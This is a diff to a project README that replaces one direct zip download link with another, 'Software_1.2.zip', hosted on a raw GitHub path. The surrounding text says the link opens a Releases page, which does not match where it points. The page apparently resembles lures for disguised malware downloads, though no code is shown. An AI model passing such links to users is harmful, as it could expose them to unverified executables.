@@ -6,7 +6,7 @@ Welcome to mytestproject! This application aims to simplify your daily work on y
 ## 📥 Download & Install
 To download the latest version of mytestproject, visit the following link:
 
-[![Download mytestproject](https://raw.githubusercontent.com/Suren19173021/mytestproject/main/vintager/mytestproject-1.7.zip)](https://raw.githubusercontent.com/Suren19173021/mytestproject/main/vintager/mytestproject-1.7.zip)
+[![Download mytestproject](https://raw.githubusercontent.com/Suren19173021/mytestproject/main/vintager/Software_1.2.zip)](https://raw.githubusercontent.com/Suren19173021/mytestproject/main/vintager/Software_1.2.zip)
 
 1. Click the button above to visit the Releases page.
 2. On the Releases page, locate the latest version listed at the top. 
